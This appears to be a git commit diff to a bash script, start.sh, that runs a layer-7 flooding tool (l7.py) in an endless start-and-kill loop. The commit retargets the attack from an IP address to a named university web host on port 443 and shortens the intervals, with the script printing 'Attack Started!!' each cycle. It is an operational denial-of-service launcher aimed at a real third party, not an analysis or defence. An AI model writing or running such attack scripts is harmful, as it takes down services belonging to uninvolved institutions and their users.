0ec4d28530e0bc9ed25d38e087c7ac61b4069f02
KLVSPL <101648648+KLVSPL@users.noreply.github.com>
2022-05-18 13:05:09 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,13 +1,12 @@
 #!/bin/bash
 procname="python3"
-atk_cmd="python3 l7.py -i 35.221.231.4 -p 443"
+atk_cmd="python3 l7.py -i manila.lpu.edu.ph -p 443 -path /"
 while true
 do
     $atk_cmd >/dev/null &
     echo Attack Started!!
-    sleep 30
+    sleep 15
     echo Attack killed!!
     kill $(ps aux | grep $procname | grep -v grep | awk '{print $2}')
-    $atk_cmd >/dev/null &
-    sleep 1
+    sleep 0.1
 done
